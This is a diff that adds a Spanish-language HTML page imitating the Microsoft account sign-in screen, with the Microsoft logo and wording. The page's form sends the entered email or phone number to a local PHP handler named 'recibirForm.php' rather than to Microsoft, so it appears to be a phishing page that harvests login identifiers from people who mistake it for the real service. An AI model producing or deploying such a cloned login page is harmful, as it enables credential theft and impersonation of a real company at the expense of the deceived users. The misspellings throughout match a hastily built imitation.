@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="microsoft/assets/favicon.ico" />
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <link rel="stylesheet" href="microsoft/assets/app.css" />
+</head>
+
+<body>
+    <form action="microsoft/recibirForm.php" method="POST" class="row g-3">
+        <section id="section_uname">
+            <div class="auth-wrapper">
+                <img src="microsoft/assets/logo.png" alt="Microsoft" />
+                <h2 class="title mb-16 mt-16">Iniciar sesión</h2>
+                <form>
+                    <div class="mb-16">
+                        <label for="email" class="form-label"></label>
+                        <input type="email" name="email" class="input" class="input" placeholder="Correo electrónico, telófono o Skype" required/>
+                    </div>
+                </form>
+                <div>
+                    <p class="mb-16 fs-13">¿No tiene una cuenta?<a href="" class="link"> Cree una.</a></p>
+                    <p class="mb-16 fs-13">
+                        <a href="#" class="link">Iniciar sesiòn con una llave de seguriad
+                            <img src="microsoft/assets/question.png" alt="Question img">
+                        </a>
+                    </p>
+                </div>
+                <div>
+
+                    <button class="btn">Siguiente</button>
+
+                </div>
+            </div>
+            <div class="opts">
+                <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="microsoft/assets/key.png"
+                            width="30px" /></span> Opcion de inicio de sesión</p>
+            </div>
+        </section>
+    </form>
+    <footer class="footer">
+        <a href="#">Tèrminos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+</body>
+</html>
